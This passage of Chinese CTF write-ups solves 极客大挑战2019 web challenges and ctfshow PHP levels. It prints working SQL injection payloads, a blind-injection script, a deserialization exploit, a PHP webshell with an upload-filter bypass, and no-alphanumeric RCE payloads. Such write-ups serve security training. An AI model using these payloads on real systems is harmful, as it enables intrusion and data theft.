目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。\n- **该漏洞的成因**主要有是管理员将备份文件放在到 web 服务器可以访问的目录下。\n- 该漏洞往往会导致服务器整站源代码或者部分页面的源代码被下载，利用。源代码中所包含的各类敏感信息，如服务器数据库连接信息，服务器配置信息等会因此而泄露，造成巨大的损失。\n- 被泄露的源代码还可能会被用于代码审计，进一步利用而对整个系统的安全埋下隐患。\n\n没什么可用的信息，那就扫一下目录\n\n`dirsearch -u \"url\" -e*`\n\n目录文件有点多，我闲着无聊就猜测一下是不是www.zip\n\nurl/www.zip\n\n发现真的有\n\n解压下来看看\n\n![image-20241111151654323](./../image/achieve/202411/极客大挑战2019/image-20241111151654323-1731309415345-5.png)\n\n我以为到这里就结束了，结果发现是假的flag\n\n那就开其他文件看看\n\n在index.php中发现是页面源码，但多了几行代码\n\n```php\n    include 'class.php';\n    $select = $_GET['select'];\n    $res=unserialize(@$select);\n```\n\nphp反序列化\n\n那我们再看看class.php\n\n```php\n<?php\ninclude 'flag.php';\n\n\nerror_reporting(0);\n\n\nclass Name{\n    private $username = 'nonono';\n    private $password = 'yesyes';\n\n    public function __construct($username,$password){\n        $this->username = $username;\n        $this->password = $password;\n    }\n\n    function __wakeup(){\n        $this->username = 'guest';\n    }\n\n    function __destruct(){\n        if ($this->password != 100) {\n            echo \"</br>NO!!!hacker!!!</br>\";\n            echo \"You name is: \";\n            echo $this->username;echo \"</br>\";\n            echo \"You password is: \";\n            echo $this->password;echo \"</br>\";\n            die();\n        }\n        if ($this->username === 'admin') {\n            global $flag;\n            echo $flag;\n        }else{\n            echo \"</br>hello my friend~~</br>sorry i can't give you the flag!\";\n            die();\n            \n        }\n    }\n}\n?>\n```\n\nphp反序列化\n\n先审代码\n\n### __construct()魔术方法\n\n构造函数，当一个对象创建时被调用\n\n这里是对username和password进行初始化赋值\n\n### __wake()魔术方法\n\n**调用unserialize()时触发**，反序列化恢复对象之前调用该方法，正常来说`wakeup`魔术方法会先被触发，然后再进行反序列化\n\n这里触发wakeup方法会将username赋值成guest\n\n### __destruct()魔术方法\n\n析构函数，**当一个对象销毁时被调用**\n\n里面有两个判断句，第一个是当password不等于100的时候会执行die()函数；第二个是当username等于admin的时候会输出flag\n\n所以我们需要让username等于admin和password为100就可以拿到flag\n\n我们构造pop链\n\n**Name::construct()->Name::destruct()**\n\npaylaod:\n\n```\n<?php\ninclude 'flag.php';\n\n\nerror_reporting(0);\n\n\nclass Name{\n    private $username = 'nonono';\n    private $password = 'yesyes';\n\n    public function __construct($username,$password){\n        $this->username = $username;\n        $this->password = $password;\n    }\n\n}\n$a  = new Name(\"admin\",\"100\");\necho serialize($a);\n?>\n```\n\n输出处理的反序列化字符串是:\n`O:4:\"Name\":2:{s:14:\"Nameusername\";s:5:\"admin\";s:14:\"Namepassword\";s:3:\"100\";}`\n\n为了避免触发wakeup魔术方法，我们还需要绕过方法\n\n### 绕过wakeup方法其一\n\n当目标类的成员属性个数大于实际个数的时候，可以绕过wakeup魔术方法，我们把反序列化字符串改一下\n\n```\nO:4:\"Name\":3:{s:14:\"Nameusername\";s:5:\"admin\";s:14:\"Namepassword\";s:3:\"100\";}\n```\n\n然后在属性那加上%00(因为成员属性类型是private，详细可以参考三种不同属性的序列化后字符串的格式)\n\n```\nO:4:\"Name\":3:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";s:3:\"100\";}\n```\n\n传入参数就可以拿到flag了\n\n## [极客大挑战 2019]EasySQL\n\n打开是一个登录界面\n\n![image-20241111154133618](../image/achieve/202411/极客大挑战2019/image-20241111154133618-1731310894787-7.png)\n\n传入1/1\n\n![image-20241111154205265](../image/achieve/202411/极客大挑战2019/image-20241111154205265-1731310926448-9.png)\n\n1.判断是否存在注入\n\n用单引号闭合试试看看是否存在注入\n\n![image-20241111154338754](../image/achieve/202411/极客大挑战2020/image-20241111154338754-1731311019919-11.png)\n\n如果页面报错，且报错信息中包含SQL语法错误或未闭合的引号等，则可能是SQL注入点，说明存在注入\n\n2.利用万能密码闭合\n\n试一下万能密码\n\n1’ or ‘1’=’1’#\n\n发现flag出来了，说明万能密码是可以做的\n\n首先学习一下sql语句逻辑运算符的优先级，由于SQL语句中逻辑运算符的优先级（=优先于AND，AND优先于OR），以及字符串拼接的特性，上述SQL语句实际上会被解析为两部分：\n\nSELECT*FROM table_name WHERE username=’1’ or ‘1’=’1’#’;and password=’1’\n\n其中，1=1恒为真。由于OR运算符的两侧只要有一侧为真，整个表达式就为真，因此整个查询条件就恒为真。这导致无论密码是什么，只要用户名是万能密码，用户都能通过验证。\n\n输入后成功获取flag\n\n## [极客大挑战 2019]LoveSQL\n\n![image-20250121004804689](../image/achieve/202411/极客大挑战2020/image-20250121004804689.png)\n\n万能密码能登进去但是没啥可用的信息\n\n常规的union联合注入就可以打\n\n```\nplaintext\n1' union select 1,2,3#回显位置为2和3\n1' union select 1,2,database()#数据库名为geek\n1' union select 1,2,(select group_concat(table_name)from information_schema.tables where table_schema='geek')#表名为geekuser,l0ve1ysq1\n1' union select 1,2,(select group_concat(column_name)from information_schema.columns where table_name='l0ve1ysq1')#列名为id,username,password\n1' union select 1,2,(select password from geek.l0ve1ysq1 where username='flag')#如果不加where子语句的话返回结果很长无法正常回显，所以我盲猜的flag\n```\n\n## [极客大挑战 2019]BabySQL\n\n题目界面是一样的，但可以看到作者对网站进行了一定的加固\n\n![image-20241111155420887](../image/achieve/202411/极客大挑战2019/image-20241111155420887-1731311661949-13-1742810078858-63.png)\n\n常规做法，先试一下万能密码\n\n1’ or 1=1#\n\n发现or不见了，猜测是被过滤了，\n\n![image-20241111190347533](../image/achieve/202411/极客大挑战2019/image-20241111190347533-1731323029026-47.png)\n\n可以再试试order，发现最后只剩der了，可以确定是or和by都被过滤了\n\n后面测试发现union,select这些关键词都被过滤了\n\n试一下双写绕过，发现可以绕过,应该绕过方法都是一样的，那就构造payload\n\n```\nplaintext\n1' oorrder bbyy 4#出错，字段数为3\n1' ununionion seselectlect 1,2,3#回显位置为2和3\n1' ununionion seselectlect 1,2,database()#数据库名为geek\n1' ununionion seselectlect 1,2,(seselectlect group_concat(column_name)frfromom infoorrmation_schema.columns whwhereere table_name='b4bsql')#表名为b4bsql,geekuser\n1' ununionion seselectlect 1,2,(seselectlect group_concat(column_name)frfromom infoorrmation_schema.columns whwhereere table_name='b4bsql')#列名为id,username,password\n-1' ununionion seselectlect 1,2,(seselectlect passwoorrd frfromom geek.b4bsql whwhereere username='flag')#\n```\n\n## [极客大挑战 2019]HardSQL\n\n![image-20250121124832767](../image/achieve/202411/极客大挑战2019/image-20250121124832767.png)\n\n传入关键词发现有警告，双写和大小写都没办法绕过，然后测出来发现sleep，union，substr等函数名都被过滤了\n\n可以用报错注入\n\n```\n-1'or(updatexml(1,concat(0x7e,(select(database())),0x7e),3))#\nXPATH syntax error: '~geek~'\n空格被过滤了，我们用括号去绕过\n-1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))#\nXPATH syntax error: '~H4rDsq1~'\n等于号也被过滤了，用like绕过\n\n-1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))#\nXPATH syntax error: '~id,username,password~'\n\n-1'or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)where(username)like('flag')),0x7e),1))#\nXPATH syntax error: '~flag{e6f22b98-2bd0-4db8-9083-af'\n漏了一部分flag，我们用right函数去拿\n\n-1'or(updatexml(1,concat(0x7e,(select(right(password,14))from(H4rDsq1)where(username)like('flag')),0x7e),1))#\n忘记复制粘贴了.....\n```\n\n## [极客大挑战 2019]FinalSQL\n\n![image-20250121011804340](../image/achieve/202411/极客大挑战2019/image-20250121011804340.png)\n\n分别点击那几个数字之后没啥可用的信息，但是我们在url中发现id参数，fuzz一下发现引号被过滤了，测出`^`符号可以使用，可以试试盲注\n\n```\nplaintext\n?id=1^(length(database())>1)页面返回error\n```\n\n能打那就直接上脚本\n\n```py\nimport requests\n\nurl=\"http://968a873e-bab6-4c98-89f0-71a63e1d8708.node5.buuoj.cn:81/search.php\"\n\nflag=\"\"\nfor i in range(1,100):\n    for j in range(32,128):\n        payload=f\"?id=1^(ascii(substr((Select(group_concat(password))from(F1naI1y)where(username='flag')),{i},1))={j})--+\"\n        r=requests.get(url+payload)\n        if \"ERROR\" in r.text:\n            flag +=chr(j)\n            print(flag)\n            break\nprint(str(flag))\n```\n\n## [极客大挑战 2019]Havefun\n\n打开页面\n\n![image-20241111173046086](../image/achieve/202411/极客大挑战2019/image-20241111173046086-1731317448508-15.png)\n\n查看页面源代码发现一段隐藏代码\n\n```\n                <!--\n        $cat=$_GET['cat'];\n        echo $cat;\n        if($cat=='dog'){\n            echo 'Syc{cat_cat_cat_cat}';\n        }\n        -->\n```\n\n直接get传入cat=dog就可以拿到flag了\n\n## [极客大挑战 2019]Secret File\n\n查看题目\n\n![image-20241111173758449](../image/achieve/202411/极客大挑战2019/image-20241111173758449-1731317879848-19.png)\n\n看看源代码有没有可用的信息\n\n![image-20241111175056679](../image/achieve/202411/极客大挑战2019/image-20241111175056679-1731318658497-21.png)\n\n发现一个Archive_room.php\n\n访问看看\n\n![image-20241111175119374](../image/achieve/202411/极客大挑战2019/image-20241111175119374-1731318681097-23.png)\n\n有一个按钮链接，点一下就跳转结束了\n\n![image-20241111175201233](../image/achieve/202411/极客大挑战2019/image-20241111175201233-1731318722812-25.png)\n\n那就抓包再send一次试试\n\n![image-20241111175315956](../image/achieve/202411/极客大挑战2019/image-20241111175315956-1731318797510-27.png)\n\n看到了一个被注释掉的secr3t.php\n\n![image-20241111175355811](../image/achieve/202411/极客大挑战2019/image-20241111175355811-1731318837374-29.png)\n\n是include()包含rce代码执行\n\n- include()函数\n\n**include就是包含文件的函数，把$file的内容包含进来.**\n\n**include()函数并不在意被包含的文件是什么类型，只要有php代码，都会被解析出来**\n\n- strstr()函数\n\n`strstr` 函数用于查找一个字符串在另一个字符串中的首次出现。如果找到了，它会返回从匹配位置到字符串末尾的部分；如果没有找到，则返回 `false`。`strstr` 是区分大小写的。\n\n- 函数原型\n\n```\nphp\nstring strstr ( string $haystack , string $needle [, bool $before_needle = false ] )\n```\n\n1. **`$haystack`**：要搜索的字符串，即干草堆。\n2. **`$needle`**：要查找的子字符串，即针。\n3. **`$before_needle`**（可选）：如果设置为 `true`，则返回 `$needle` 出现之前的部分；如果未设置或设置为 `false`，则返回从 `$needle` 出现的位置开始到 `$haystack` 末尾的部分。\n\n解析代码:\n\n```\nif(strstr($file,\"../\")||stristr($file, \"tp\")||stristr($file,\"input\")||stristr($file,\"data\"))\n```\n\n用strstr去匹配这些字符串，如果符合则会进行if语句执行exit\n\n既然input和data被禁用了，很明显了，我们可以用filter伪协议去读文件\n\nphp://filter/convert.base64-encode/resource=flag.php\n\n然后会返回base64编码的字符串，解码一下就可以看到flag了\n\n![image-20241111180542885](../image/achieve/202411/极客大挑战2019/image-20241111180542885-1731319544378-31.png)\n\n## [极客大挑战 2019]Knife\n\n打开题目就看到了一句话木马\n\n![image-20241111181358741](../image/achieve/202411/极客大挑战2019/image-20241111181358741-1731320040380-33.png)\n\n但因为我们不确定这个一句话木马是不是写在这个网站下\n\n先看看源码\n\n![image-20241111181515797](../image/achieve/202411/极客大挑战2019/image-20241111181515797-1731320116909-35.png)\n\n查看源码发现一句话木马是写在当前网站下的\n\n那就直接用蚁剑连，密码就是Syc，连上后在更目录就可以zhao'd\n\n(其实我个人理解蚁剑就是一个自动的rce工具，密码就是传入rce的参数，蚁剑可以通过这个参数执行命令获取目录以及文件内容，并整合起立返回给我们)\n\n## [极客大挑战 2019]Upload\n\n![image-20241111183058737](../image/achieve/202411/极客大挑战2019/image-20241111183058737-1731321059960-37.png)\n\n黑盒测试的文件上传漏洞\n\n先传一个一句话木马文件试试，发现有文件类型限制\n\n![image-20241111183232544](../image/achieve/202411/极客大挑战2019/image-20241111183232544-1731321153685-39.png)\n\n抓包修改文件后缀判断一下是不是前端验证，然后发现\n\n![image-20241111185030775](../image/achieve/202411/极客大挑战2019/image-20241111185030775-1731322231946-41.png)\n\n可见是对文件后缀过滤了php，试试绕过后缀，发现双写可以绕过，但是对`<?`进行了过滤，那我们换成phtml格式的一句话木马\n\n![image-20241111185201905](../image/achieve/202411/极客大挑战2019/image-20241111185201905-1731322322914-43.png)\n\n绕过文件后缀验证了，但也对文件内容进行了检查\n\n那就直接用phtml一句话木马去做吧\n\n```\nphtml\n<script language=\"php\">eval($_REQUEST[cmd])</script>\n```\n\n传上去然后修改了conten头，但还是被警告了得上传图片\n\n![image-20241111185556170](../image/achieve/202411/极客大挑战2019/image-20241111185556170-1731322557379-45.png)\n\n那就伪造一下jpg格式\n\n### GIF89a伪造jpg格式文件\n\n前面加上GIF89a，这个可以伪造成jpg格式的文件。\n\n上传后显示上传成功，猜测是在/upload路径下\n\n于是访问/upload/1.phtml，成功后用蚁剑进行连接，就可以找到flag\n\n## [极客大挑战 2019]BuyFlag\n\n打开题目，在menu里面找到flag的有关网站\n\n![image-20241111193758763](../image/achieve/202411/极客大挑战2019/image-20241111193758763-1731325079995-49.png)\n\n看到需要验证学生的身份，猜测是cookie有关的，那就先抓包看看\n\n![image-20241111193841804](../image/achieve/202411/极客大挑战2019/image-20241111193841804-1731325122814-51.png)\n\n看到隐藏代码，意思是我们需要post传入两个参数，money的值根据页面来说我们需要100000000money才能买flag，password的话需要绕过验证且值为404，可以看到这里是弱比较，所以404a或者404abc都能通过验证，那就传参吧(记得修改请求包，改成post请求包)\n\n![image-20241111194130278](../image/achieve/202411/极客大挑战2019/image-20241111194130278-1731325291368-53.png)\n\n可以看到我们是成功通过验证了，但显示需要学生的身份，这时候我们可以注意到cookie有一个参数user等于0，cookie通常被用作身份验证，猜测把user改成1就行了，因为0表示false，1表示true\n\n**这边显示密码正确，身份验证也对了，但是money错误，怀疑是长度问题。（you have not enough money,loser~）**\n\n![image-20241111194400685](../image/achieve/202411/极客大挑战2019/image-20241111194400685.png)\n\n试着把money改成数组形式或者用科学计数法就可以了\n\n## [极客大挑战 2019]RCE ME\n\n```php\nphp\n<?php\nerror_reporting(0);\nif(isset($_GET['code'])){\n    $code=$_GET['code'];\n         if(strlen($code)>40){\n                die(\"This is too Long.\");\n        }\n                    if(preg_match(\"/[A-Za-z0-9]+/\",$code)){\n                        die(\"NO.\");\n                    }\n                    @eval($code);\n}\nelse{\n            highlight_file(__FILE__);\n}\n\n// ?>\n```\n\nrce代码执行\n\n审代码\n\n我们通过get传入一个参数code，这个参数必须满足以下条件\n\n- code参数的字符串长度不能大于40\n- 绕过preg_match正则匹配的字符\n\npreg_match(“/[A-Za-z0-9]+/“,$code\n\n- **`A-Za-z0-9]`**：表示字符集，匹配任意一个字母（大写或小写）或数字。\n- **`+`**：表示前面的字符集可以出现一次或多次。\n\n这就是很经典的无字母无数字rce\n\n可参考的做法就是用异或，取反，自增（这里限制了长度，所以自增不可以）进行构造payload\n\n我这里直接用取反方法给payload了，方法的话直接参考这三种方法构造payload就行\n\npayload:\n\n取反脚本\n\n```\nphp\n<?php\n$c='phpinfo()';\n$d=urlencode(~$c);\n$e=~($d);\n// if(preg_match(\"/[A-Za-z0-9]+/\",$e)){\n//     echo 0;\n// }else {\n//     echo 1;\n// }\necho $d;\n?>\nurl/?code=(~%8F%97%8F%96%91%99%90)();\nplaintext\ndisable_functions:\n\npcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl\n```\n\n这么多函数都被禁用了，我们想办法代入`antsword`处理\n\n先看一下php的版本\n\n```\nplaintext\nPHP Version 7.0.33`在7.2之前，构造`assert(eval($_POST[a]));\nphp\n<?php \n$a='assert';\n$b=urlencode(~$a);\necho $b;\necho \"\\n\";\n$c='eval($_POST[a])';\n$d=urlencode(~$c);\necho $d;\n?>\n```\n\n上传后进行访问，用蚁剑进行连接，但发现readflag无法读取，权限设置也读不了，这时候可以用蚁剑的插件\n\n![image-20241111204701806](../image/achieve/202411/极客大挑战2020/image-20241111204701806-1731329222948-55.png)\n\n然后\n\n![image-20250121173054824](../image/achieve/202411/极客大挑战2020/image-20250121173054824.png)\n\n可以看到终端出来了，我们直接/readflag就可以拿到flag了\n","tags":["极客大挑战2019"],"categories":["赛题wp"]},{"title":"web入门php篇-ctfshow(已做完)","url":"/2024/11/10/web入门php篇-ctfshow(已做完)/","content":"\n# 0x01基础知识\n\n## php特性\n\n放一下主要的知识点\n\n## 调用命令的常用函数\n\n在 PHP 中，exec、system 和、passthru 都是用来调用外部 Linux 命令的函数，但它们还是有区别的：\n\n（1）system()\n\n用于执行外部程序；\n输出命令的执行结果到标准输出设备，并返回命令的最后一行结果；\n可以通过传递第二个参数来捕获命令执行后的返回状态码。\n\n（2）passthru()\n\n用于执行外部程序；\n将命令的原始输出直接发送到标准输出设备（通常是浏览器）；\n不返回任何值，但可以通过第二个参数捕获命令执行后的返回状态码。\n\n（3）exec()\n\n用于执行外部程序；\n不会输出结果到标准输出，而是将最后一行结果作为返回值返回；\n如果传入第二个参数（数组），可以将所有输出保存到这个数组中；\n第三个参数是一个整数变量，用于捕获命令执行后的返回状态码。\n\n# 0x02题目\n\n## web89\n\n```php\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\n\nif(isset($_GET['num'])){\n    $num = $_GET['num'];\n    if(preg_match(\"/[0-9]/\", $num)){\n        die(\"no no no!\");\n    }\n    if(intval($num)){\n        echo $flag;\n    }\n}\n```\n\n\n\nf(intval($num))--检查变量 `$num` 的整数值是否为真（即非零）\n\nif(preg_match(\"/[0-9]/\", $num))--用于检查变量 `$num` 是否包含至少一个数字字符（0-9）\n\n### 关于preg_match\n\n因为preg_match只能处理字符串，可以利用数组绕过，所以当传入的是数组时会返回false。\n\n### intval()函数\n\n`intval()` 函数是 PHP 中的一个内置函数，它用于获取变量的整数值。这个函数尝试将给定的变量转换为整数类型，并返回转换后的结果。\n\n函数原型\n\n```php\nint intval ( mixed $var [, int $base = 10 ] )\n```\n\n### 数组绕过intval函数\n\n intval 转换数组类型时 不关心数组中的内容 只判断数组中有没有元素，而intval函数当传入的变量是非空数组的时候，会返回1\n\npayload:\n\n?num[]=1\n\n## web90\n\n```php\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\nif(isset($_GET['num'])){\n    $num = $_GET['num'];\n    if($num===\"4476\"){\n        die(\"no no no!\");\n    }\n    if(intval($num,0)===4476){\n        echo $flag;\n    }else{\n        echo intval($num,0);\n    }\n}\n```\n\n`intval($num,0)===4476---intval($num, 0)` 将 `$num` 转换为整数。如果 `$num` 是字符串，可以转换为数字\n\n### 强比较(===)\n\n在 PHP 中，**强比较**（strict comparison）是指使用 `===` 和 `!==` 运算符进行的比较。这种比较不仅会检查两个值是否相等，还会检查它们的类型是否相同\n\n- **强比较**（`===`）：比较值和类型，不进行转换。\n\n- 举个例子:\n\n  ```php\n  $a = 5;          // 整数\n  $b = \"5\";        // 字符串\n  if ($a === $b) {\n      echo \"'$a' 和 '$b' 是相等的（强比较）。\";\n  } else {\n      echo \"'$a' 和 '$b' 不相等。\"; // 这句会被执行\n  }\n  ```\n\n  在这个例子中，由于 `$a` 是整数，而 `$b` 是字符串，因此比较结果为不相等。\n\n### intval处理字符串\n\nintval处理开头是数字的字符串时，返回值为开头的数\n\n`intval()`输入的值，如果是字符串，它返回的内容取决于字符串最左侧的字符\n\n`intval` 函数扫描参数字符串，跳过前面的空格字符，直到遇上数字或正负符号才开始做转换，再遇到非数字或字符串结束时(\\0)结束转换，并将结果返回\n\npaylaod:\n\n?num=4476a\n\n## web91\n\n```php\nshow_source(__FILE__);\ninclude('flag.php');\n$a=$_GET['cmd'];\nif(preg_match('/^php$/im', $a)){\n    if(preg_match('/^php$/i', $a)){\n        echo 'hacker';\n    }\n    else{\n        echo $flag;\n    }\n}\nelse{\n    echo 'nonononono';\n}\n```\n\n`preg_match('/^php$/im', $a)`---检查变量 `$a` 中的内容是否完全匹配“php”，且对大小写不敏感。\n\n**`^`**：匹配字符串的开始位置。这意味着字符串必须从这个模式开始。\n\n**`php`**：字面值“php”，表示我们要匹配的具体字符串。\n\n**`$`**：匹配字符串的结束位置。这意味着字符串必须以这个模式结束。\n\n**`i`**：这是一个修饰符，表示匹配时不区分大小写（case-insensitive）。因此，会匹配“php”、“PHP”、“Php”等。\n\n### preg_match多行匹配修饰符\n\n**`m`**：这是多行匹配修饰符，影响 `^` 和 `$` 的行为。在多行模式下，这两个符号也可以匹配每一行的开始和结束，而不仅仅是整个字符串的开始和结束。在这个特定的例子中，`m` 修饰符的影响不大，因为我们是匹配整个字符串。\n\n- im模式是可以匹配很多行,i模式只能匹配一行\n\n意味着这里的第一层匹配的是多行的php，而第二行匹配的是单行的php，所以我们加个换行符就行\n\npayload:\n\n`?cmd=0%0aphp`\n\n## web92\n\n```php\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\nif(isset($_GET['num'])){\n    $num = $_GET['num'];\n    if($num==4476){\n        die(\"no no no!\");\n    }\n    if(intval($num,0)==4476){\n        echo $flag;\n    }else{\n        echo intval($num,0);\n    }\n}\n```\n\n### 弱比较(==)\n\n\"弱比较\"（或称为\"非严格比较\"）通常指的是在比较两个值时，不考虑它们的数据类型。当使用这个运算符比较两个值时，PHP 会尝试将它们转换为相同的类型，然后进行比较。**但是弱比较（例如使用 `==` 运算符）不会进行进制转换**\n\n举个例子\n\n```php\n$a = 5;          // 整数\n$b = \"5\";        // 字符串\n\nif ($a == $b) {\n    echo \"'$a' 和 '$b' 是相等的（弱比较）。\"; // 这句会被执行\n} else {\n    echo \"'$a' 和 '$b' 不相等。\";\n}\n```\n\n在这个例子中，尽管 `$a` 是一个整数，而 `$b` 是一个字符串，但由于弱比较，PHP 会将 `$b` 转换为整数，然后比较，因此判断结果为相等。\n\n#### 和强比较的区别\n\n两个等号是**先把等号两边的变量转化成相同的类型**，如果转换类型后的结果是相等的，就认为相等。\n\n三个等号是**先判断两边变量的数据类型**，如果数据类型相同，再去判断两边的值，如果值相等，那么为真。\n\n### 关于intval()函数汇总\n\n**intval** 函数是PHP中用于获取变量的整数值的函数。它通过使用指定的进制（默认是十进制）来转换变量，并返回其整数值。\n\n#### **intval** 函数的基本语法\n\n```php\nint intval(mixed $var [, int $base = 10])\n```\n\n其中，*$var* 是需要转换成整数的变量，*$base* 是转换所使用的进制。如果*$base*是0，则会根据*$var*的格式来决定使用的进制。例如，如果字符串以\"0x\"开头，则使用16进制；如果字符串以\"0\"开头，则使用8进制；否则，默认使用10进制。**intval** 函数的返回值是变量的整数值。如果转换失败，它会返回0。对于空数组，它返回0，而对于非空数组，它返回1。\n\n#### intval绕过思路\n\n在某些情况下，**intval** 函数可能被用于验证输入值。如果某个特定的值被过滤或禁止，可以通过**改变进制或添加小数点**等方式来绕过这些限制。例如，如果数字10被过滤，可以使用它的8进制表示*012*或16进制表示*0xA*来绕过。对于弱类型比较（如*a==b*），可以传入空数组使得比较结果为*true*。此外，如果需要绕过数字限制，可以通过增加小数位（如*3.1*）或使用算术运算符（如*5+5*）来实现。\n\npayload:\n\n方法一:使用非十进制数传递\n\n```\n?num=010574(八进制)\n?num=0x117c(十六进制)\n```\n\n方法二:使用科学计数法\n\n```\n?num=4476e123\n```\n\n(根据intval处理字符串的机制)\n\n## web93\n\n```php\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\nif(isset($_GET['num'])){\n    $num = $_GET['num'];\n    if($num==4476){\n        die(\"no no no!\");\n    }\n    if(preg_match(\"/[a-z]/i\", $num)){\n        die(\"no no no!\");\n    }\n    if(intval($num,0)==4476){\n        echo $flag;\n    }else{\n        echo intval($num,0);\n    }\n}\n```\n\n禁用了字母，但采用八进制和小数点都可以绕过\n\n### 弱比较之浮点数和整数\n\n在 PHP 中，弱比较（使用 `==` 运算符）确实可能会受到小数点的影响，浮点数和字符串中的数字在 PHP 中可以通过弱比较被认为是相等的，前提是它们的数值相同。但对于浮点数4476.1和整数4476在php中整数在比较时会被视为浮点数，php会将4476转化成浮点数4476.1，然后进行比较，可见这两个浮点数是不相等的。详细可以参考类型转换的规则\n\npayload:\n\n`?num=4476.1`or`?num=?num=010574(八进制)`\n\n## web94\n\n```php\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\nif(isset($_GET['num'])){\n    $num = $_GET['num'];\n    if($num===\"4476\"){\n        die(\"no no no!\");\n    }\n    if(preg_match(\"/[a-z]/i\", $num)){\n        die(\"no no no!\");\n    }\n    if(!strpos($num, \"0\")){\n        die(\"no no no!\");\n    }\n    if(intval($num,0)===4476){\n        echo $flag;\n    }\n}\n```\n\nstrpos($num, \"0\")\n\n### strpos函数\n\n在 PHP 中，`strpos()` 函数用于查找一个字符串在另一个字符串中首次出现的位置\n\n基本语法：\n\n`strpos(string $haystack, string $needle, int $offset = 0): int|false`\n\n- **$haystack**：要搜索的字符串。\n- **$needle**：要查找的字符串（或字符）。\n- **$offset**：可选的参数，指定从哪个位置开始搜索。\n\n- 如果找到了字符，`strpos()` 会返回字符首次出现的位置（从 `0` 开始计数）。\n\n所以这道题的payload中必须有0 但不能是开头为0，如果开头为0会导致输出的0所在的位置是0，那么!0就是1，就会执行里面的die函数\n\npayload:\n\n`?num=4476.0`或者在010574八进制数字前加上空格符(其他换行符什么的也行)或者+号保证第一个0出现的位置不是0\n\n## web95\n\n```php\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\nif(isset($_GET['num'])){\n    $num = $_GET['num'];\n    if($num==4476){\n        die(\"no no no!\");\n    }\n    if(preg_match(\"/[a-z]|\\./i\", $num)){\n        die(\"no no no!!\");\n    }\n    if(!strpos($num, \"0\")){\n        die(\"no no no!!!\");\n    }\n    if(intval($num,0)===4476){\n        echo $flag;\n    }\n}\n```\n\n这次比之前多过滤了小数点，那就不用小数点进行绕过，我们用八进制加上一些空白符号就行了\n\npayload:\n\n?num=%20010574\n\n# web96\n\n```php\n\nhighlight_file(__FILE__);\n\nif(isset($_GET['u'])){\n    if($_GET['u']=='flag.php'){\n        die(\"no no no\");\n    }else{\n        highlight_file($_GET['u']);\n    }\n\n\n}\n```\n\n过滤了flag.php\n\n### highlight_file()函数\n\n```\nhighlight_file($filename,$return)\n$filename  必需。要进行高亮处理的 PHP 文件的路径。\n$return     可选。如果设置 true，则本函数返回高亮处理的代码。\n```\n\n这里使用绝对路径或者当前路径绕过：\n\n`u=./flag.php    //相对路径\nu=/var/www/html/flag.php   //由于绝对路径是已知的，所以直接使用`\n\n或者可以用php伪协议去做\n\n`?u=php://filter/resource=flag.php`\n\n`u=php://filter/read=convert.base64-encode/resource=flag.php`\n\n因为这个条件语句检查 URL 查询参数 `u` 的值是否等于字符串 `'flag.php'`\n\n但是这个只读流的值实际上是一个特殊的过滤器，而不是简单的字符串 `'flag.php'`。具体如下：\n\n1. **`php://filter`**：这是一个 URL 流，允许你使用 PHP 内置的过滤器来读取或写入数据。\n2. **`read=convert.base64-encode`**：这部分指定了一个过滤器，它会将 `flag.php` 资源的内容读取并进行 Base64 编码。\n3. **`resource=flag.php`**：这部分指定了要读取的资源。\n\n## web97\n\n```php\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\nif (isset($_POST['a']) and isset($_POST['b'])) {\nif ($_POST['a'] != $_POST['b'])\nif (md5($_POST['a']) === md5($_POST['b']))\necho $flag;\nelse\nprint 'Wrong.';\n}\n?>\n```\n\nmd5($_POST['a']) === md5($_POST['b'])--用来比较两个通过 HTTP POST 请求提交的字段 `a` 和 `b` 的 MD5 哈希值是否相等\n\n要求：1、用 POST 方式传递参数\n\n　　  2、参数 a、b 不相等\n\n　　  3、两参数 MD5 相等\n\n### md5哈希值\n\nMD5（Message-Digest Algorithm 5）是一种广泛使用的哈希函数，它会将任意长度的数据（通常是字符串）映射为一个固定长度的输出，即 128 位（16 字节）的哈希值。通常，MD5 的输出以 32 位的十六进制数字表示。\n\n对于php强比较和弱比较：md5()函数无法处理数组，如果传入的为数组，会返回NULL，两个数组经过加密后得到的都是NULL，也就是相等的。\n\n做题方法:\n\n#### 用数组进行绕过md5验证\n\n传入两个不同的数组，经md5加密后结果都是null，比较则相等\n\npayload:\n\n`a[]=1&b[]=2`\n\n(注意不要让这两个数组的元素值相等哈，不然就不会绕过第一层判断了)\n\n#### md5强碰撞\n\n对于 md5 强碰撞，我们需要找到两个 md5 值真正相同的数据。\n\npayload:\n\n十六进制格式的两个不同字符串：\n\n`4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2`\n`4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2`\n两者都有 MD5 哈希： 